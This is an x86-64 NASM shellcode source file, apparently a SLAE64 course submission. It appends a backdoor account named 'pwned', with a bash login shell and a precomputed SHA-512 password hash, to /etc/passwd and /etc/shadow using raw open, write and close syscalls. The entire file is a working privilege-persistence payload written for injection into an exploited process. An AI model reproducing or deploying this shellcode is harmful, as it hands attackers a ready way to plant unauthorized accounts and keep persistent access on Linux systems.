; shellcode name add_user_password_JCP_open,write,close
; Author    : Christophe G SLAE64-1337
; Len       : 358 bytes
; Language  : Nasm
; "name = pwned ; pass = $pass$"
; add user and password with open,write,close
; tested kali linux , kernel 3.12


global _start

_start:

       xor rax , rax
       push rax
       pop rsi
       push rax                                       ; null all register used for open syscall
       pop rdx
       add al , 0x2
       mov rdi , 0x647773ffffffffff
       shr rdi , 0x28
       push rdi                                       ; "/etc/passwd"
       mov rdi , 0x7361702f6374652f
       push rdi
       mov rdi , rsp
       mov si , 0x441
       mov dx , 0x284
       syscall                                        ; open syscall

       xor edi , edi
       add dil , 0x3

jmp short findaddress                                   ; I placed the jmp short here size of code is too lenght for jmp short if placed in head 

_respawn:

       pop r9
       mov  [r9 + 0x30] , byte 0xa                     ; terminate the string 
       lea rsi , [r9]   ; "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash'    
       mov al , 0x1                                    
       xor rdx , rdx
       add rdx , 0x31
       syscall                                         ; write syscall

       xor edi , edi
       add dil , 0x3
       push rdi                                  
pop rax
       syscall                                         ; close syscall

       xor rax , rax
       push rax
       pop rsi
       add al , 0x2
       mov rdi , 0x776f64ffffffffff                   ; open '/etc/shadow'
       shr rdi , 0x28
       push rdi
       mov rdi , 0x6168732f6374652f
       push rdi
       mov rdi , rsp
       mov si , 0x441
       mov dx , 0x284
       syscall                                       ; open syscall


       xor rax , rax
       add al , 0x1
       xor edi , edi
       add dil , 0x3
       lea rsi , [r9 + 0x31]                      ;  "pwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::", 0xa
       push rax
       pop rdx
       add dl , 0x83
       syscall                                    ; write syscall 

       xor edi , edi
       add dil , 0x3
       push rdi
       pop rax
       syscall




       xor rax , rax
       add al , 0x3c                             ;   exit (no matter value of exit code)
       syscall


     findaddress:
        call _respawn
        string : db "pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bashApwned:$6$uiH7x.vhivD7LLXY$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7:::",0xa

